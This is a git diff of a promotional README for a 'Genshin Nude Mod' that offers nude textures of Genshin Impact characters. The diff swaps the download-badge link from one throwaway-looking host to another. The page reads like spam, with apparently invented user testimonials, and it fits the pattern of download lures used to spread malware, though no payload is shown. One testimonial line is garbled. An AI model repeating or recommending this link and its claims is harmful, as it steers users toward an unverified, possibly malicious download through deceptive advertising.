@@ -2,7 +2,7 @@
 
 Genshin Impact is already packed with waifus and eye candy — but if you’re ready to take things to a *NSFW level*, the **Genshin Nude Mod** is what you’re looking for. With high-quality **nude texture replacements**, detailed **custom models**, and **private mod loaders**, this mod turns Teyvat into an uncensored fantasy adventure. Whether you're simping for Lisa, Shenhe, Ganyu, or Yae, these mods give you full visual freedom. 💋
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Genshin-Nude-Mod-ly1.github.io/.github)
 ---
 
 ## 🧠 What Is the Genshin Nude Mod?
@@ -76,7 +76,7 @@ Each character mod can be used standalone or combined with pose/camera packs for
 ## 🗣️ What Users Say
 
 💬 *“Modded Ganyu on my test build... I haven’t gone back to the regular version since.”* – NSFWTraveler
-💬 *“Raiden Shogun in full control. 10/10 detail. Unreal.”* – ShrineLurker
+���� *“Raiden Shogun in full control. 10/10 detail. Unreal.”* – ShrineLurker
 💬 *“Private server + camera mod + nude pack = best solo Genshin experience.”* – ScreenshotSimp
 
 ---
